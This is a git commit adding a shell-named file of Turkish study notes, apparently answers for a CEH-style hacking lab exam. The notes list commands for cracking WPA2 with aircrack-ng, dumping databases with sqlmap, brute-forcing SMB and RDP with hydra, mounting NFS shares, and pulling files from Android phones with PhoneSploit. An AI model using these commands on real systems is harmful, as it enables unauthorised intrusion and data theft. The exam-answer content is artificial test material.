c23b2c903668c2e38afbc02017eb4a10fd284944
suu120796 <163857748+suu120796@users.noreply.github.com>
2026-01-16 16:31:17 +0300

    Add files via upload

---
+++ notlar.sh
@@ -0,0 +1,112 @@
+
+
+ 802.11 protokolü kablosuz paketleri ifade etmektedir.Aircrack-ng kullanarak bir WPA2 ağını kırma
+
+ aircrack-ng -a2 -b [Hedef BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
+ -a, el sıkışmayı kırmak için kullanılan tekniktir, 2 = WPA tekniği.
+-b, BSSID'yi ifade eder; hedef yönlendiricinin BSSID'si ile değiştirin.
+-w, kelime listesi anlamına gelir; kelime listesine giden yolu belirtin.
+
+
+
+dosyayı veracrypte mount et
+hash.txt senin pass crackstation sitesiyle decrpt et
+txt yi al
+
+
+
+ıot pcap hemen mqtt protokolüne bakk
+
+
+direct dediği web dizinine git cyberchefden ya da crackstation dan çöz
+
+
+
+sqlmap 
+konulardan birine gir 
+id li urli koyala 
+sqlmap -u url --dbs --dump lı paramerte gir
+ex:
+sqlmap -u "url....id=13" --cookie="cookiedegeri" --dbs 
+--dump 
+-D tablename --tables
+-D tablename -T sütunname --dump 
+
+
+webisteisne /phantom.txt yaz çıkar
+
+
+
+www.cehorg.com/?page_id=103
+www.cehorg.com/?page_id='103'
+
+
+
+sam/test
+id li sqlmap yap 
+-technique bq -risk 3 cinema veritabnı 
+-D cinema 
+--tables kullan
+
+conversaitonda 80 portuna istek atanı yaz
+
+
+die ile entry point istedii
+
+
+ftp://ipadres:port şifre yok Martin
+
+die ile hallet image version 
+yeri:image optional   major minor imageden çekkk
+olmazsa PE explorer
+
+
+
+smb:ip gir hydra ile bruteforce yap 
+masaüstü wordlist kullan
+
+soru7 
+txt var snow.exe ile decrpt et parola sorudan:password
+base64 gelecek cyberchef ya da crackstationda çevir
+
+
+commondlineexecution  cle
+nfs ssh açık olana bak linux makina hedef o 
+nfs yi mount et 
+showmount -e 192.168.1.10
+mkdir /mnt/nfs
+mount <HEDEF_IP>:/home /mnt/nfs
+cat stealthnet.txt
+
+
+low olanalrın sayısı 
+openwas ya da zaproxy
+nessus 
+
+
+5555 android phonesploit sdcard image dosyaısnı al
+decrypt et > steghide dene mesela openstego bulamazsan
+steghide extract -sf x.jpeg
+
+
+rdp hydra saldırısı 
+xfreerdp ile bağlan
+cfe bul tool ile aç şifre sorar jonesin şifreisni yaz 
+foto çıkacak hash my filese at 
+
+ imap bul verison -A 
+
+
+zenmap domain controller 88 445 53 ...
+dns computer name 
+
+
+
+
+
+
+
+
+
+
+
